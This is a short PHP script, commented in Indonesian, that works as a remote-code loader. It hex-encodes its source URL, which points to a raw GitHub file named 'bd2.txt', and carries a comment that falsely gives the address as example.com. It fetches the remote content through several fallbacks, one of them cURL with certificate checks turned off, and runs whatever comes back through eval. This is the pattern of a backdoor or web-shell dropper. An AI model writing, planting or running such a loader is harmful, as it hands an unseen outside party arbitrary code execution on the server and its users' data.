<?php
// Ubah hex ini dengan URL tujuan yang di-encode ke hex
$hexUrl = "68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F6C797961686D2F726464646F6F2F726566732F68656164732F6D61696E2F6264322E747874"; // https://example.com/script.php

// Fungsi untuk decode hex ke string
function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}

// Fungsi untuk ambil isi dari URL
function fetchRemoteCode($url) {
    $data = false;

    // Coba pakai file_get_contents jika diizinkan
    if (ini_get('allow_url_fopen')) {
        $data = @file_get_contents($url);
    }

    // Fallback pakai cURL
    if (!$data && function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 10,
        ]);
        $data = curl_exec($ch);
        curl_close($ch);
    }

    // Fallback pakai fopen manual
    if (!$data && ($fp = @fopen($url, 'r'))) {
        $data = '';
        while (!feof($fp)) {
            $data .= fread($fp, 8192);
        }
        fclose($fp);
    }

    return $data;
}

// Jalankan proses
$url     = hex2str($hexUrl);
$phpCode = fetchRemoteCode($url);

// Eksekusi isi PHP dari remote jika berhasil diambil
if ($phpCode !== false) {
    try {
        eval("?>".$phpCode);
    } catch (Throwable $e) {
        echo "❌ Error saat menjalankan kode: " . $e->getMessage();
    }
} else {
    echo "❌ Gagal mengambil kode dari URL: $url";
}
?>
